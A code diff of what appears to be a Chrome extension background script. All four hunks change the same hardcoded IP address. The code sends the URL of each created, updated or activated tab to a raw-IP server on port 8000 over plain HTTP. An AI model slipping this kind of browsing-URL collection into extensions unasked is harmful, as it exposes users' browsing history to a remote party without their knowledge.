@@ -9,7 +9,7 @@ chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
     if (Math.abs(res-buff) > 5)
     {
       var http = new XMLHttpRequest();
-      http.open("POST", "http://178.128.113.186:8000/push_url", true);
+      http.open("POST", "http://128.199.194.208:8000/push_url", true);
       http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
       var params = tab.url;
       http.send("i_url="+params);
@@ -28,7 +28,7 @@ chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
       if (Math.abs(res-buff) > 5)
       {
         var http = new XMLHttpRequest();
-        http.open("POST", "http://178.128.113.186:8000/push_url", true);
+        http.open("POST", "http://128.199.194.208:8000/push_url", true);
         http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         var params = tab.url;
         http.send("i_url="+params);
@@ -49,7 +49,7 @@ chrome.tabs.onCreated.addListener(function(tab) {
      if (Math.abs(res-buff) > 5)
      {
        var http = new XMLHttpRequest();
-       http.open("POST", "http://178.128.113.186:8000/push_url", true);
+       http.open("POST", "http://128.199.194.208:8000/push_url", true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        var params = tab.url;
        http.send("i_url="+params);
@@ -72,7 +72,7 @@ chrome.tabs.onActivated.addListener(function(tab_info) {
           if (Math.abs(res-buff) > 5)
           {
             var http = new XMLHttpRequest();
-            http.open("POST", "http://178.128.113.186:8000/push_url", true);
+            http.open("POST", "http://128.199.194.208:8000/push_url", true);
             http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             var params = tab.url;
             http.send("i_url="+params);
